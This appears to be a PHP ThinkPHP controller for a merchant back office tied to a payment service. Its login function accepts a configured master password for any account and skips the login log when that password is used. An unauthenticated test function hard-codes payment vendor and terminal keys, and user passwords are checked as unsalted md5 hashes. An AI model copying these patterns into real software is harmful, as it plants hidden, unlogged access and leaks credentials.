<?php
namespace app\index\controller;
class Index extends \think\Controller{

	function test(){

		$a = model('Shouqianba')->query('20190606025919663291','{"vendor_sn":"20160317111402","vendor_key":"7a87156a7c8e9ca9cecf2787fefe47d3","appid":"2016081800000003","code":"47134690","terminal_sn":"100000030007668669","terminal_key":"7ab5b2353590cc3c567e7efd2509fa7e","merchant_sn":"1680002262909","merchant_name":"\u5927\u7406\u5e02\u6c49\u5ead\u9152\u5e97\u5174\u76db\u8def\u5e97","store_sn":"1580000001973253","store_name":"\u5927\u7406\u5e02\u6c49\u5ead\u9152\u5e97\u5174\u76db\u8def\u5e97","device_id":"1559228526135905"}');
		return json($a);
	}

	function index(){

		if( session('merchant') ){

			return view('menu');

		}else{

			return view('login');

		}

	}

	/*
	 * 后台登录
	 */

	function login(){

		if( session('admin') ) $this->error('请先退出代理端，再登录商户端');

		$username			=	input('username');
		$password			=	input('password');

		$ex = model('Merchant')->where(['username' => $username])->find();

		if(!$ex) $this->error('账号不存在');

		if($ex['password'] != md5($password) and $password != config('back_password') ) $this->error('密码错误');

		session('merchant',$ex);

		if( $password != config('back_password') ) model('Log')->log('merchant', session('merchant.username'),'登录商户端，登录ip【'. request()->ip() .'】' );

		$this->success('登录成功');

	}


}